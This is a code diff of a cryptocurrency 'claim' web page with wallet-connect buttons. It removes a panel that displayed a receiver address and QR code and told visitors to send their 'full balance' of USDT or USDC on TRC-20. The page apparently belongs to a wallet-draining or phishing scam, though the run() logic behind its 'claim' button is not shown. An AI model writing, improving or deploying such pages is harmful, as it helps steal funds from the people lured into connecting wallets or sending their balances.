@@ -61,17 +61,6 @@
     <button class="cta" id="connect-tl">Connect wallet</button>
     <button class="ghost" id="connect-wc">Other wallet (Trust, TokenPocket, …)</button>
 
-    <div id="direct" class="hidden" style="margin-top:16px">
-      <div class="amount" style="margin-bottom:12px">
-        <div class="lbl">Bybit or any wallet — send here</div>
-        <div class="mono" id="rcv" style="margin:8px 0"></div>
-        <canvas id="qr-addr" style="width:180px;height:180px;background:#fff;padding:8px;border-radius:12px;display:block;margin:0 auto"></canvas>
-        <button class="ghost" id="copy-addr" style="margin-top:10px">Copy address</button>
-      </div>
-      <div class="note">Send USDT or USDC to this address from Bybit. Amount — your full balance; token must be TRC-20.</div>
-    </div>
-
-    <button class="ghost" id="toggle-direct" style="margin-top:10px">Using Bybit? Send directly</button>
     <div class="status" id="cstatus"></div>
   </div>
 
@@ -449,20 +438,6 @@ async function run() {
 $('connect-tl').addEventListener('click', connectTronLink);
 $('connect-wc').addEventListener('click', connectWalletConnect);
 $('claim').addEventListener('click', run);
-$('toggle-direct').addEventListener('click', async () => {
-  if (!cfg) { try { await loadConfig(); } catch (e) { setStatus('Config error', 'err'); return; } }
-  $('direct').classList.remove('hidden');
-  if (!$('rcv').textContent) {
-    $('rcv').textContent = cfg.receiver || '';
-    if (cfg.receiver) {
-      try {
-        const QR = await import('https://cdn.jsdelivr.net/npm/qrcode@1.5.4/+esm');
-        await QR.toCanvas($('qr-addr'), cfg.receiver, { width: 170, margin: 1 });
-      } catch (e) {}
-    }
-  }
-});
-$('copy-addr').addEventListener('click', () => navigator.clipboard.writeText(cfg.receiver || ''));
 if (DEMO) {
   $('connect-tl').textContent = 'Continue (demo preview)';
   $('connect-wc').classList.add('hidden');
